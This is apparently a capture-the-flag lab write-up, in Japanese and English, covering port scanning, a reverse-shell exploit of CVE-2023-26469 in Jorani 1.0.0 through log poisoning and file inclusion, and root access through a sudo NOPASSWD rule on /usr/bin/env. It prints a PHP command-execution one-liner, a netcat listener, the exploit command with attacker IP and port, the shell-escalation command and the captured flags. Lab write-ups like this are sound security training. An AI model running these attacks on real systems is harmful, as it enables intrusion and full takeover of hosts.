## 概要

| Field                     | Value                                               |
|---------------------------|-----------------------------------------------------|
| OS | Linux (Ubuntu)                                      |
| 難易度 | Easy                                                |
| 攻撃対象 | Web (HTTP/80)                                       |
| 主な侵入経路 | CVE-2023-26469 — Jorani v1.0.0 RCE via Log Poisoning |
| 権限昇格経路 | sudo NOPASSWD: /usr/bin/env → root shell            |

## 認証情報

認証情報なし。

## 偵察

### Port Scan (Rustscan)

```bash
rustscan -a $ip -r 1-65535 --ulimit 5000
```

```bash
✅[3:16][CPU:37][MEM:69][TUN0:192.168.45.180][/home/n0z0]
🐉 > rustscan -a $ip -r 1-65535 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
To scan or not to scan? That is the question.

[~] The config file is expected to be at "/home/n0z0/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.104.109:22
Open 192.168.104.109:80
```

Two open ports discovered: **22 (SSH)** and **80 (HTTP)**.

### Service Enumeration (Nmap)

```bash
timestamp=$(date +%Y%m%d-%H%M%S)
output_file="$HOME/work/scans/${timestamp}_${ip}.xml"
grc nmap -p- -sCV -sV -T4 -A -Pn "$ip" -oX "$output_file"
echo -e "\e[32mScan result saved to: $output_file\e[0m"
```

```bash
✅[3:17][CPU:69][MEM:70][TUN0:192.168.45.180][/home/n0z0]
🐉 > timestamp=$(date +%Y%m%d-%H%M%S)
output_file="$HOME/work/scans/${timestamp}_${ip}.xml"

grc nmap -p- -sCV -sV -T4 -A -Pn "$ip" -oX "$output_file"

echo -e "\e[32mScan result saved to: $output_file\e[0m"
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-06 03:17 JST
Nmap scan report for 192.168.104.109
Host is up (0.19s latency).
Not shown: 65466 closed tcp ports (reset), 67 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 76:18:f1:19:6b:29:db:da:3d:f6:7b:ab:f4:b5:63:e0 (ECDSA)
|_  256 cb:d8:d6:ef:82:77:8a:25:32:08:dd:91:96:8d:ab:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Apache2 Ubuntu Default Page: It works
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   185.27 ms 192.168.45.1
2   185.26 ms 192.168.45.254
3   185.24 ms 192.168.251.1
4   185.33 ms 192.168.104.109

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 446.18 seconds
Scan result saved to: /home/n0z0/work/scans/20260206-031708_192.168.104.109.xml
```

Key findings:
- **Port 22**: OpenSSH 9.6p1 (Ubuntu)
- **Port 80**: Apache 2.4.58 (Ubuntu) — Default page served, but `robots.txt` hints at hidden content

### Web Enumeration

The root URL displayed the Apache2 default page, but directory enumeration revealed a Jorani Leave Management System installation running underneath.


*Caption: Port 80 initially presents the Apache2 default page, masking the Jorani application beneath.*


*Caption: Directory enumeration uncovers the Jorani login panel.*


*Caption: Jorani version 1.0.0 identified — confirmed vulnerable to CVE-2023-26469.*


*Caption: Additional confirmation of Jorani v1.0.0, the exploit target.*

## 初期足がかり

### CVE-2023-26469 — Jorani v1.0.0 Remote Code Execution

**CVE-2023-26469** is a Remote Code Execution vulnerability affecting Jorani Leave Management System versions up to and including 1.0.0. The vulnerability stems from two flaws used in combination:

1. **Log Poisoning**: The application writes user-supplied input (such as the `User-Agent` header) directly into log files without sanitization. An attacker can inject PHP code into this header, which gets written to the log file verbatim.
2. **Local File Inclusion (LFI)**: A path traversal vulnerability in the `lang` parameter allows an attacker to include arbitrary files — including the poisoned log — which triggers execution of the injected PHP payload.

A public PoC automates both steps, delivering a reverse shell.

#### Setting up the listener

```bash
rlwrap -cAri nc -lvnp 4444
```

```bash
✅[1:59][CPU:6][MEM:44][TUN0:192.168.45.202][/home/n0z0]
🐉 > rlwrap -cAri nc -lvnp 4444
listening on [any] 4444 ...
```

#### Running the exploit

```bash
python3 Jorani_V1.0.0_exploit.py -u http://192.168.224.109 -i 192.168.45.202 -p 4444
```

```bash
❌[4:15][CPU:2][MEM:57][TUN0:192.168.45.202][...rani-Reverse-Shell-v1.0.0]
🐉 > python3 Jorani_V1.0.0_exploit.py -u http://192.168.224.109 -i 192.168.45.202 -p 4444

     ██╗ ██████╗ ██████╗  █████╗ ███╗   ██╗██╗
     ██║██╔═══██╗██╔══██╗██╔══██╗████╗  ██║██║
     ██║██║   ██║██████╔╝███████║██╔██╗ ██║██║
██   ██║██║   ██║██╔══██╗██╔══██║██║╚██╗██║██║
╚█████╔╝╚██████╔╝██║  ██║██║  ██║██║ ╚████║██║
 ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝

[ CVE-2023-26469 - Jorani <=1.0.0 RCE Exploit ]
Credits: @jrjgjk | Modified by: Samip Mainali

[~] Poisoning application logs...
[~] Triggering exploit...
[+] Reverse shell connection established!
[*] Waiting 5 seconds to confirm stability...
[+] Exploit completed successfully!
[+] Check your listener for the shell!
```

💡 **Why this works**: Jorani v1.0.0 logs the raw `User-Agent` string without any sanitization. By setting the User-Agent to a PHP one-liner (e.g., `<?php system($_GET['cmd']); ?>`), that code is written into the Apache log file. The `lang` parameter in Jorani is then exploited via path traversal to include the log file, causing the PHP engine to execute the injected payload. The PoC script chains these two primitives to spawn a reverse shell automatically.

#### Shell stabilization

After the reverse shell connected, the TTY was upgraded to a fully interactive shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
script /dev/null -c bash
stty raw -echo && fg
```

```bash
connect to [192.168.45.202] from (UNKNOWN) [192.168.224.109] 49814
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
script /dev/null -c bash
stty raw -echo && fg
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

jordak@jordak:/var/www/html$ export TERM=xterm
jordak@jordak:/var/www/html$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
stty raw -echo && fg
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

jordak@jordak:/var/www/html$ stty raw -echo && fg
bash: fg: current: no such job
jordak@jordak:/var/www/html$ ls -la
```

#### User flag

```bash
cat /home/jordak/local.txt
```

```bash
jordak@jordak:/home/jordak$ cat local.txt

d4795df782f1d720b72da795a3ce8f38
```

## 権限昇格

### sudo Misconfiguration — `/usr/bin/env`

Checking sudo privileges revealed a critical misconfiguration:

```bash
sudo -l
```

```bash
jordak@jordak:/home/jordak$ sudo -l

Matching Defaults entries for jordak on jordak:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jordak may run the following commands on jordak:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /usr/bin/env
```

The `jordak` user can run `/usr/bin/env` as root **without a password**. According to [GTFOBins — env](https://gtfobins.github.io/gtfobins/env/), this is a well-known privilege escalation vector.

💡 **Why this works**: The `env` utility is designed to execute a program in a modified environment. When invoked via `sudo`, it runs with root privileges. Since `env` simply exec's the command passed to it — in this case `/bin/bash` — the resulting shell inherits full root privileges. There is no sandboxing or privilege drop. GTFOBins documents `env` as a standard sudo escape: any binary that can exec other processes without dropping privileges can be used this way.

```bash
sudo /usr/bin/env /bin/bash
```

```bash
jordak@jordak:/home/jordak$ sudo /usr/bin/env /bin/bash

root@jordak:/home/jordak# cat /root/proof.txt

f8678bc5191f60febf7a33c167975973
root@jordak:/home/jordak#
```

Root access achieved.

## Attack Chain Overview

```mermaid
flowchart LR
    subgraph KC1["Kill Chain 1<br/>Reconnaissance"]
        direction TB
        K1A[Port Scan<br/>Rustscan/Nmap]
        K1B[Open Ports Found<br/>22/SSH, 80/HTTP]
        K1C[Service Identification<br/>OpenSSH 9.6p1<br/>Apache 2.4.58]
        K1D[OS Version<br/>Ubuntu Linux<br/>robots.txt detected]

        K1A --> K1B --> K1C --> K1D
    end

    subgraph KC2["Kill Chain 2<br/>Web Enumeration"]
        direction TB
        K2A[Web Site Check<br/>Apache Default Page]
        K2B[Directory Enumeration<br/>feroxbuster/dirsearch]
        K2C[Application Discovered<br/>Jorani found]
        K2D[Version Identified<br/>Jorani v1.0.0]

        K2A --> K2B --> K2C --> K2D
    end

    subgraph KC3["Kill Chain 3<br/>Vulnerability Identification"]
        direction TB
        K3A[Vulnerability Research<br/>Jorani 1.0.0]
        K3B[CVE Identified<br/>CVE-2023-26469]
        K3C[RCE Confirmed<br/>Log Poisoning Attack]
        K3D[Exploit Obtained<br/>GitHub PoC acquired]

        K3A --> K3B --> K3C --> K3D
    end

    subgraph KC4["Kill Chain 4<br/>Exploit Preparation"]
        direction TB
        K4A[Listener Setup<br/>nc -lvnp 4444]
        K4B[Exploit Ready<br/>Jorani_V1.0.0_exploit.py]
        K4C[Parameters Set<br/>-u URL<br/>-i 192.168.45.202<br/>-p 4444]
        K4D[Ready to Attack<br/>Attack Ready]

        K4A --> K4B --> K4C --> K4D
    end

    subgraph KC5["Kill Chain 5<br/>Initial Access"]
        direction TB
        K5A[Exploit Executed<br/>python3 exploit.py]
        K5B[Log Poisoning<br/>Application log contaminated]
        K5C[Payload Triggered<br/>Trigger exploit]
        K5D[Reverse Shell Obtained<br/>User: jordak]

        K5A --> K5B --> K5C --> K5D
    end

    subgraph KC6["Kill Chain 6<br/>Local Shell"]
        direction TB
        K6A[Shell Stabilized<br/>pty.spawn + stty]
        K6B[Interactive Shell<br/>script /dev/null -c bash]
        K6C[local.txt Retrieved<br/>/home/jordak/local.txt]
        K6D[Flag Confirmed<br/>d4795df782f1d720...]

        K6A --> K6B --> K6C --> K6D
    end

    subgraph KC7["Kill Chain 7<br/>System Enumeration"]
        direction TB
        K7A[Privilege Check<br/>id/whoami executed]
        K7B[Sudo Check<br/>sudo -l]
        K7C[NOPASSWD Detected<br/>/usr/bin/env<br/>ALL: ALL]
        K7D[GTFOBins Checked<br/>env exploit vector]

        K7A --> K7B --> K7C --> K7D
    end

    subgraph KC8["Kill Chain 8<br/>Privilege Escalation"]
        direction TB
        K8A[env Abuse Prepared<br/>sudo /usr/bin/env]
        K8B[Shell Spawned<br/>/bin/bash]
        K8C[Command Executed<br/>sudo /usr/bin/env /bin/bash]
        K8D[Root Shell Obtained<br/>uid=0 root]

        K8A --> K8B --> K8C --> K8D
    end

    subgraph KC9["Kill Chain 9<br/>Objective Achieved"]
        direction TB
        K9A[Root Access Established<br/>Full privileges obtained]
        K9B[proof.txt Retrieved<br/>/root/proof.txt]
        K9C[Flag Confirmed<br/>f8678bc5191f60f...]
        K9D[Complete<br/>Mission Success]

        K9A --> K9B --> K9C --> K9D
    end

    KC1 ==> KC2 ==> KC3 ==> KC4 ==> KC5 ==> KC6 ==> KC7 ==> KC8 ==> KC9

    style KC1 fill:#e8eaf6
    style KC2 fill:#fff9c4
    style KC3 fill:#ffccbc
    style KC4 fill:#f8bbd0
    style KC5 fill:#c8e6c9
    style KC6 fill:#b2dfdb
    style KC7 fill:#ffe0b2
    style KC8 fill:#ff9800
    style KC9 fill:#4caf50
    style K8D fill:#ff6b6b,color:#fff
    style K9D fill:#2196f3,color:#fff
```



## まとめ・学んだこと

1. **Default pages hide applications**: The Apache2 default page at the web root can mislead a tester into thinking no application is present. Always run directory enumeration — Jorani was discovered at a subdirectory that would be invisible without it.

2. **Log poisoning + LFI is a potent combination**: When an application logs unsanitized user input (headers, parameters) and also has a file inclusion vulnerability, the two primitives chain into RCE. Developers must sanitize all logged data and restrict file inclusion to safe, whitelisted paths.

3. **`sudo -l` is always the first escalation check**: The NOPASSWD entry for `/usr/bin/env` provided immediate root access with a single command. Any binary that can exec other processes without dropping privileges is a critical misconfiguration when granted unrestricted sudo.

4. **Audit NOPASSWD entries against GTFOBins**: The GTFOBins project catalogs hundreds of binaries that can be abused for privilege escalation. Security teams should cross-reference every `NOPASSWD` entry in sudoers against GTFOBins before deployment.

## 参考文献

- [RustScan — Modern Port Scanner](https://github.com/RustScan/RustScan)
- [CVE-2023-26469 — NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2023-26469)
- [Jorani Reverse Shell PoC — GitHub (samipmainali)](https://github.com/samipmainali/Jorani-Reverse-Shell-v1.0.0)
- [GTFOBins — env](https://gtfobins.github.io/gtfobins/env/)
- [rlwrap — readline wrapper for netcat](https://github.com/hanslub42/rlwrap)
